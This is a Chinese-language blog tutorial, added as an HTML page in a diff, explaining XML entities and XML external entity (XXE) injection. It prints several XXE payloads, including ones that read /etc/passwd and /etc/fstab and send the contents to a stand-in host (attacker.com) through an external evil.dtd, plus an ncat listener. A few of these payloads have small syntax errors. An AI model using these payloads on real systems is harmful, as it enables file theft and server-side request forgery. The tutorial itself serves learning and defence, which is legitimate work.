@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="关于xml实体注入的学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xml实体注入(xxe)">
+<meta property="og:url" content="http://yoursite.com/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/index.html">
+<meta property="og:site_name" content="V3D4&#39;s Blog">
+<meta property="og:description" content="关于xml实体注入的学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/1.png">
+<meta property="article:published_time" content="2020-07-24T14:17:41.000Z">
+<meta property="article:modified_time" content="2020-07-25T01:13:03.648Z">
+<meta property="article:author" content="V3geD4g">
+<meta property="article:tag" content="xml">
+<meta property="article:tag" content="xxe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xml实体注入(xxe) | V3D4's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    
+	<a href="https://github.com/V3geD4g" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    
+	<header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">V3D4's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">安全技术记录/分享/交流</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="V3geD4g">
+      <meta itemprop="description" content="一个小菜鸡的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V3D4's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xml实体注入(xxe)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-24 22:17:41" itemprop="dateCreated datePublished" datetime="2020-07-24T22:17:41+08:00">2020-07-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-07-25 09:13:03" itemprop="dateModified" datetime="2020-07-25T09:13:03+08:00">2020-07-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">关于xml实体注入的学习</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这几天突然想了解一下什么是xml实体注入，于是在b站看到了<a href="https://www.bilibili.com/video/BV1at41177SA" target="_blank" rel="noopener">这个视频</a>，讲的挺不错的，但理解还不是很深刻，所以写下这篇博客记录一下。</p>
+<p>基本上大致知道了如何去利用xml实体注入，所以为了节省时间（也还是懒）,就照搬一下这位师傅的<a href="https://www.cnblogs.com/xiaoxiaosen/p/13093985.html" target="_blank" rel="noopener">这篇博客</a>，加上一些自己的看法，写下这篇博客</p>
+<h2 id="一、什么是xml"><a href="#一、什么是xml" class="headerlink" title="一、什么是xml"></a>一、什么是xml</h2><p>XML（可扩展标记语言）与HTML类似，但HTML与数据表示有关，而XML更多与数据传输、存储有关。</p>
+<p>先来看看xml文档格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>  //元数据，版本为xml解析器解析的版本</span><br><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>John<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">Age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;Person&gt;&lt;/Person&gt;</code>为根元素，有且仅有一个</p>
+<p>需要注意的是，标签对大小写敏感，前后标签必须一致，如<code>&lt;read&gt;&lt;/Read&gt;</code>则是错误的，必须<code>&lt;read&gt;&lt;/read&gt;</code></p>
+<p><code>&lt; ，&gt; ，&quot; ，&#39; , &amp;</code>等符号不被允许直接出现在XML文档中，因为xml解析器会搞不清这些符号是数据还是标签</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Age</span>&gt;</span>20 <span class="tag">&lt; &gt;</span> &amp; " '<span class="tag">&lt;/<span class="name">Age</span>&gt;</span>   //×错误</span><br></pre></td></tr></table></figure>
+
+<p>那么这个时候就需要Entity来解决这个问题 </p>
+<h2 id="二、关于Entity实体"><a href="#二、关于Entity实体" class="headerlink" title="二、关于Entity实体"></a>二、关于Entity实体</h2><p>Entity（可用实体）：一种简单的存储单元，好比xml的变量，可以对它进行赋值，并在xml文档的不同地方对它进行引用。</p>
+<p>实体（Entity）在xml文档中的文档类型定义部分（DTD）被单独定义描述。</p>
+<p>举个栗子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">2 &lt;!DOCTYPE Person [</span><br><span class="line">3     &lt;! ENTITY name &quot;John&quot;&gt;   &#x2F;&#x2F;定义了一个存储单元，这个简单Entity名称就为name，将john放入了name这个实体中</span><br><span class="line">4 ]&gt; </span><br><span class="line">&#x2F;&#x2F;换行写是格式规范，如果将其写成一行如下，可以看到括号都是匹配的</span><br><span class="line">&#x2F;&#x2F;&lt;!DOCTYPE Person [&lt;! ENTITY name &quot;John&quot;&gt;]&gt;</span><br><span class="line">5 &lt;Person&gt;</span><br><span class="line">6     &lt;Name&gt;&amp;name;&lt;&#x2F;Name&gt;  </span><br><span class="line">&#x2F;&#x2F;用&amp;符号调用实体name才能成功执行，也不要忘记最后的分号</span><br><span class="line">7     &lt;Age&gt;20&lt;&#x2F;Age&gt;</span><br><span class="line">8 &lt;&#x2F;Person&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2~4行代码就是通过DTD方式创建了一个ENTITY告知xml解析器这是一个DTD定义类型</p>
+<p><strong>Entity分为三类</strong></p>
+<p>①一般实体General（通用型实体）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;!ENTITY name &quot;pwn&quot;?&gt;</span><br><span class="line">...</span><br><span class="line">&lt;hello&gt;&amp;name;&lt;&#x2F;hello&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通用型实体就是上面举的那个栗子</p>
+<p>ps：原博客这里写错了，我改了下</p>
+<p>②参数实体Parameter（必须预定在单独的DTD区域）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % outer &quot;&lt;! ENTITY inner &#39;John&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>区别貌似就是定义实体名字的时候要加<code>%</code>，还有参数实体可以用一个Entity给另一个Entity赋值，也由于这个特性，在xxe中挺有作用的，可以想办法套娃绕过之类的</p>
+<p>③预定义实体Predefined（某些特殊符号的一组预定义数值集）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;hello&gt;&amp;#x3c;&lt;&#x2F;hello&gt;  &#x2F;&#x2F; &lt;的十六进制表示</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&amp;#x3c;</code>代替<code>&lt;</code>就可以避免xml解释器报错了</p>
+<h2 id="三、外部实体（Xml-External-Entity）"><a href="#三、外部实体（Xml-External-Entity）" class="headerlink" title="三、外部实体（Xml External Entity）"></a>三、外部实体（Xml External Entity）</h2><p>实体（Entity）有哪些用途呢？</p>
+<ol>
+<li><p>存储指定数值；</p>
+</li>
+<li><p>从本地文件、从远程网络中调用相关数据，作为后续实体引用;</p>
+</li>
+</ol>
+<p>那么这就会出现问题</p>
+<p>我们先来看看外部实体的一个实例，来帮助我们了解其工作机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">    &lt;! ENTITY subscribe SYSTEM &quot;secret.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;subscribe;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SYSTEM 关键字让xml解析器知道该实体是一个外部实体，需要xml解析器去获取 “ secret.txt ” 其中的外部资源，并把它存储到内部实体 subscribe 中</p>
+<p><strong>需要注意的是，如果secret.txt中的内容如果包含<code>&lt;,&gt;</code>等xml语法中的标签，那么xml解析器就会报错，也就不能读取其中的内容了，至于如何解决这个问题，后面会提到</strong></p>
+<p><code>&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;</code>表示内部实体<code>subscribe</code>会后续在<code>&lt;pwn&gt;</code>标签中被调用</p>
+<p><code>secret.txt</code>其中的内容被赋值到了内部实体<code>subscibe</code>中</p>
+<p>其中的SYSTEM后面可以跟URI，即<code>STSYEM “URI”</code></p>
+<p>这里支持有效的URI（文件、http、ftp和其他协议形式内容，如<code>SYSTEM &quot;http://127.0.0.1&quot;</code>）</p>
+<h2 id="四、外部实体注入-（XXE）"><a href="#四、外部实体注入-（XXE）" class="headerlink" title="四、外部实体注入 （XXE）"></a>四、外部实体注入 （XXE）</h2><p>分类：</p>
+<ul>
+<li><p>带内数据 in-band （就是我们上面举的外部实体的那个栗子，将内部的数据带出来，应该也是比赛最常见的，直接读取/flag之类的）</p>
+</li>
+<li><p>基于错误 error-based （有点像盲注，解析结果没有其他，只有一堆报错，就类似报错注入吧）</p>
+</li>
+<li><p>带外数据 out-of-band（真正的盲注，无任何回显，需要借助服务器监听外带数据）</p>
+</li>
+</ul>
+<p><strong>按照视频里讲的，这里再主要介绍一下OOB XXE，下面的这些解释也是完全按照视频的原话来的，可能讲的也不太清楚</strong></p>
+<p>OOB XXE（盲注XXE）</p>
+<p>当我们遇到这种情况时，一个web应用程序，它可以解析XML输入，但是却无任何输出响应，必须用带外请求把目标提取出来，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用。</p>
+<p>例如，在存在xxe漏洞的地方，输入以下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY subscrible SYSTEM &quot;http:&#x2F;&#x2F;attack.com:1337&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;subscrible;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机attack.com主机上监听1337端口</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lp 1337</span><br></pre></td></tr></table></figure>
+
+<p>可以看见有反应</p>
+<p>XXE ——————&gt; server ———————-&gt;attack.com</p>
+<p>受害端有效解析了xml，正尝试获取我们在attack.com上的资源作为实体引用，这样我们就能以受害端的身份发起请求了，这就是<strong>SSRF</strong></p>
+<h2 id="五、加载外部DTD"><a href="#五、加载外部DTD" class="headerlink" title="五、加载外部DTD"></a>五、加载外部DTD</h2><p>DTD并不是xml数据的一部分，它们总是再根元素的定义之上，所以DTD也可以像实体一样，从外部加载，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE Pwn SYSTEM &quot;external.dtd&quot;&gt;</span><br><span class="line">&lt;Pwn&gt;test&lt;&#x2F;Pwn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>程序解析时，解析器将从外部DTD中提取并解析内容，这种机制可以构造结构良好的xml文档，因为它将定义和数据部分区分了开来，但同时也带来了更加广的攻击面</p>
+<p>上面的例子中调用的<code>external.dtd</code>内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % name &quot;JEF&quot;&gt;</span><br><span class="line">&lt;!ENTITY % outer &quot;&lt;!ENTITY inner &#39;My name is %name;&#39;&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再来通过一个例子更加直观的来看看xml解析器解析的过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE Pwn [</span><br><span class="line">	&lt;!ENTITY % parameter_entity &quot;&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;&quot;  </span><br><span class="line">    %parameter_entity; &#x2F;&#x2F;参数实体只能在当前DTD中调用</span><br><span class="line">    &#x2F;&#x2F;等效于&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;pwn&gt;&amp;general_entity;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个例子中，我们定义了一个参数实体<code>parameter_entity</code>，而这个参数实体的值，又是通过另一个参数实体<code>general_entity</code>来定义的，这种方式我们上面也讲到过</p>
+<p>再在DTD中调用<code>%parameter_entity;</code>即等效于<code>&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;</code></p>
+<p>最后在根元素中调用<code>&amp;general_entity;</code>即完成了整个流程</p>
+<p>接下来再看一个盲注XXE的具体例子吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">    &lt;!ENTITY % passwd SYSTEM &quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">    &lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;attacker.com&#x2F;?%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">    %wrapper;</span><br><span class="line">]</span><br><span class="line">&lt;pwn&gt;&amp;send;&lt;&#x2F;pwn&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面这个例子中，读取了/etc/passwd中的内容，通过http的方式将数据带出，<code>%wrapper</code>就相当于<code>&lt;!ENTITY send SYSTEM &#39;http://attacker.com/?CONTENTS_OF_PASSWD&#39;</code></p>
+<p>但如果直接使用上面这个例子，那么肯定会报错，因为xml的规定中，不能在实际的标记语言中在调用实体参数，即在<code>http://attacker.com/?%passwd;</code>直接调用%passwd这一步是错误的，但可以在同级别中被当作标记语言调用，即<code>%wrapper;</code>是正确的（挺奇葩的规定）</p>
+<p>但是上面的规则仅限于内部DTD，所以为了上面这种情况的发生，就可以用外部DTD来绕过它，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;attacker.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中evil.dtd中的内容就是之前读取/etc/passwd的部分，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;attacker.com&#x2F;?%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>
+
+<p>这样，就成功读取到了/etc/passwd中的内容到我们的攻击机上</p>
+<h2 id="六、当读取的内容中有xml语法标签时"><a href="#六、当读取的内容中有xml语法标签时" class="headerlink" title="六、当读取的内容中有xml语法标签时"></a>六、当读取的内容中有xml语法标签时</h2><p>还是用五中的例子，如果我们换成读取/etc/fstab中的内容时，会发现读取失败了，因为其中有xml语法标签<code>&lt;,&gt;</code>，如图</p>
+<p><img src="/2020/07/24/xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-xxe/1.png" alt="1"></p>
+<p>那么要如何去读取数据呢？这里就要用到CDATA</p>
+<p>CDATA表示字符数据，它是一种特殊语法，在CDATA开闭标签中的文本部分不会被XML标记语言解析处理，也就达到了我们的目的，它的格式如下</p>
+<p><code>&lt;![CDATA[ &lt;text&gt; ]]&gt;</code></p>
+<p>如果直接写在一个DTD中，也会报五中一样的错误，所以这里也需要用到加载外部DTD的方法，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;evil.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中evil.dtd的内容是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;fstab&quot;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;    </span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY all &#39;%start;%file;%end;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实xxe这部分内容也不是很多，视频也就20分钟左右，但主要是从来没了解过，这次算是了解的比较清楚了。最近老是偷懒，又感觉没了学习的动力，博客也更新的少了，这样下去不行啊，得赶紧调整状态，落下了就是落下了，还是很难受的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xml/" rel="tag"># xml</a>
+              <a href="/tags/xxe/" rel="tag"># xxe</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/17/BJDCTF2020-EasySearch/" rel="prev" title="[BJDCTF2020]EasySearch">
+      <i class="fa fa-chevron-left"></i> [BJDCTF2020]EasySearch
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
